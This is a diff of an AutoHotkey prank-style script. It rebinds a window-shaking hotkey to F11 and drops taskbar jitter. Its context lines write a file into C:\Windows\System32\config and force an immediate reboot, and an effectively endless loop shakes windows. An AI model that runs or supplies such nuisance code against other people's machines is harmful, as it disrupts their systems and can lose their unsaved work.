@@ -46,7 +46,7 @@ FileAppend, kalala, C:\Windows\System32\config\OSDATA
 Run, shutdown /r /t 0
 }
 return
-MButton::
+F11::
 ; identify class
 WinGetClass, CurrentClass, A
 
@@ -69,14 +69,6 @@ Loop, 100000000000000 ; Number of "waves" of shaking
         
         ; move the specific window by ID
         WinMove, ahk_id %this_id%,, X + MoveX, Y + MoveY
-    }
-    
-if WinExist("ahk_class Shell_TrayWnd")
-    {
-        WinGetPos, TX, TY, , , ahk_class Shell_TrayWnd
-        Random, TMoveX, -10, 10
-        Random, TMoveY, -10, 10
-        WinMove, ahk_class Shell_TrayWnd,, TX + TMoveX, TY + TMoveY
     }
     Sleep, 1 ; prevent the cpu from absolutely being destroyed, not showing the effects of the script
 }
